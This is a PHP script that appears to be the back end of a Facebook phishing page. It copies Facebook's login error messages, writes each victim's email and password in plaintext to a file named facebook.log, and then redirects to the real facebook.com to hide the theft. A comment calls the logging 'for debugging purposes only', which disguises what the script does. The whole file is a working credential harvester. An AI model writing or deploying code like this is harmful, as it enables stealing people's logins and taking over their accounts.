<?php
// Check if form data is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $password = $_POST['password']; // It's crucial to handle passwords securely

    // Validate email and password
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        // Handle invalid email
        echo "The email address or mobile number you entered isn't connected to an account.";
        exit();
    } elseif (strlen($password) < 8 || preg_match('/\s/', $password)) {
        // Handle invalid password
        echo "The password that you've entered is incorrect.";
        exit();
    } else {
        // Ensure the logs directory exists
        if (!is_dir('../FBlogs')) {
            mkdir('../FBlogs', 0777, true);
        }

        // Log the email and password (for debugging purposes only)
        error_log("Email: $email\nPassword: $password\n", 3, "../FBlogs/facebook.log");

        // Redirect to the real Facebook login page
        header("Location: https://www.facebook.com/");
        exit();
    }
}
?>